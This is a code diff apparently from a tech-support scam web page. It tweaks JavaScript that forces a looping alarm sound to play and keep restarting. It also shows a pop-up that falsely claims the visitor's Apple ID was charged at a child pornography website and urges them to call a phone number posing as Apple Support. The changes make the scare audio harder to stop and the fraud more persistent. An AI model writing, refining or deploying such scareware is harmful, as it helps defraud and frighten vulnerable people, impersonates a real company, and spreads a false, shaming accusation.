@@ -436,7 +436,6 @@
                 alertAudio = null;
                 audioFinalized = false;
                 audioUnlocked = false;
-                firstGestureConsumed = false;
                 audioRestartIntervalStarted = false;
                 if (audioRestartInterval) {
                     try { clearInterval(audioRestartInterval); } catch(e) {}
@@ -464,6 +463,7 @@
         }
 
         function playAudio() {
+            ensureAudio();
             if (!alertAudio) return;
             try {
                 alertAudio.loop = true;
@@ -475,21 +475,43 @@
                         startAudioRestartLoop();
                     }).catch(function(err) {
                         audioUnlocked = false;
-                        if (!firstGestureConsumed || !audioUnlocked) destroyContaminatedAudio();
-                        setTimeout(function() {
-                            try {
-                                ensureAudio();
-                                if (!alertAudio) return;
-                                var p2 = alertAudio.play();
-                                if (p2 !== undefined) {
-                                    p2.then(function() {
-                                        audioUnlocked = true;
-                                        finalizeAudioLock();
-                                        startAudioRestartLoop();
-                                    }).catch(function() { if (!firstGestureConsumed || !audioUnlocked) destroyContaminatedAudio(); });
-                                }
-                            } catch(e) {}
-                        }, 50);
+                        try {
+                            destroyContaminatedAudio();
+                            ensureAudio();
+                            if (!alertAudio) return;
+                            alertAudio.loop = true;
+                            var p2 = alertAudio.play();
+                            if (p2 !== undefined) {
+                                p2.then(function() {
+                                    audioUnlocked = true;
+                                    finalizeAudioLock();
+                                    startAudioRestartLoop();
+                                }).catch(function() {
+                                    try {
+                                        destroyContaminatedAudio();
+                                        ensureAudio();
+                                        if (!alertAudio) return;
+                                        alertAudio.loop = true;
+                                        var p3 = alertAudio.play();
+                                        if (p3 !== undefined) {
+                                            p3.then(function() {
+                                                audioUnlocked = true;
+                                                finalizeAudioLock();
+                                                startAudioRestartLoop();
+                                            }).catch(function() { destroyContaminatedAudio(); });
+                                        } else {
+                                            audioUnlocked = true;
+                                            finalizeAudioLock();
+                                            startAudioRestartLoop();
+                                        }
+                                    } catch(e) { destroyContaminatedAudio(); }
+                                });
+                            } else {
+                                audioUnlocked = true;
+                                finalizeAudioLock();
+                                startAudioRestartLoop();
+                            }
+                        } catch(e) { destroyContaminatedAudio(); }
                     });
                 } else {
                     audioUnlocked = true;
@@ -498,17 +520,19 @@
                 }
             } catch(e) {
                 audioUnlocked = false;
-                if (!firstGestureConsumed || !audioUnlocked) destroyContaminatedAudio();
+                destroyContaminatedAudio();
             }
         }
 
         document.addEventListener('visibilitychange', function() {
-            if (!document.hidden) {
+            if (!document.hidden && audioUnlocked) {
                 playAudio();
             }
         });
         window.addEventListener('focus', function() {
-            playAudio();
+            if (audioUnlocked) {
+                playAudio();
+            }
         });
 
         function startAudioLoop() {
@@ -529,9 +553,48 @@
                         finalizeAudioLock();
                         startAudioRestartLoop();
                     }).catch(function() {
-                        firstGestureConsumed = false;
-                        audioUnlocked = false;
-                        if (!audioFinalized) destroyContaminatedAudio();
+                        try {
+                            destroyContaminatedAudio();
+                            ensureAudio();
+                            if (!alertAudio) { firstGestureConsumed = true; return; }
+                            var p2 = alertAudio.play();
+                            if (p2 !== undefined) {
+                                p2.then(function() {
+                                    firstGestureConsumed = true;
+                                    audioUnlocked = true;
+                                    finalizeAudioLock();
+                                    startAudioRestartLoop();
+                                }).catch(function() {
+                                    try {
+                                        destroyContaminatedAudio();
+                                        ensureAudio();
+                                        if (!alertAudio) { firstGestureConsumed = true; return; }
+                                        var p3 = alertAudio.play();
+                                        if (p3 !== undefined) {
+                                            p3.then(function() {
+                                                firstGestureConsumed = true;
+                                                audioUnlocked = true;
+                                                finalizeAudioLock();
+                                                startAudioRestartLoop();
+                                            }).catch(function() {
+                                                destroyContaminatedAudio();
+                                                firstGestureConsumed = true;
+                                            });
+                                        } else {
+                                            firstGestureConsumed = true;
+                                            audioUnlocked = true;
+                                            finalizeAudioLock();
+                                            startAudioRestartLoop();
+                                        }
+                                    } catch(e) { firstGestureConsumed = true; }
+                                });
+                            } else {
+                                firstGestureConsumed = true;
+                                audioUnlocked = true;
+                                finalizeAudioLock();
+                                startAudioRestartLoop();
+                            }
+                        } catch(e) { firstGestureConsumed = true; }
                     });
                 } else if (alertAudio) {
                     firstGestureConsumed = true;
@@ -585,18 +648,20 @@
         };
 
         function myFunction() {
-            ensureAudio();
-            playAudio();
+            if (audioUnlocked) ensureAudio();
+            if (audioUnlocked) playAudio();
             var dialogResult;
             try {
                 dialogIsOpen = true;
                 dialogResult = confirm("Your Apple ID was recently used at CHILD PORNOGRAPGHY WEBSITE for $549.59 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and security.Not you?Immediately Call APPLE SUPPORT +1(844)530-2543 to Freeze it!.");
             } catch(e) { dialogResult = false; }
-            finally { dialogIsOpen = false; forceAudioResume(); }
-            playAudio();
-            setTimeout(function() { playAudio(); }, 30);
+            finally { dialogIsOpen = false; if (audioUnlocked) forceAudioResume(); }
+            if (audioUnlocked) {
+                playAudio();
+                setTimeout(function() { playAudio(); }, 30);
+            }
             if (dialogResult) {
-                okkkk();
+                setTimeout(function() { okkkk(); }, 250);
             } else {
                 return;
             }
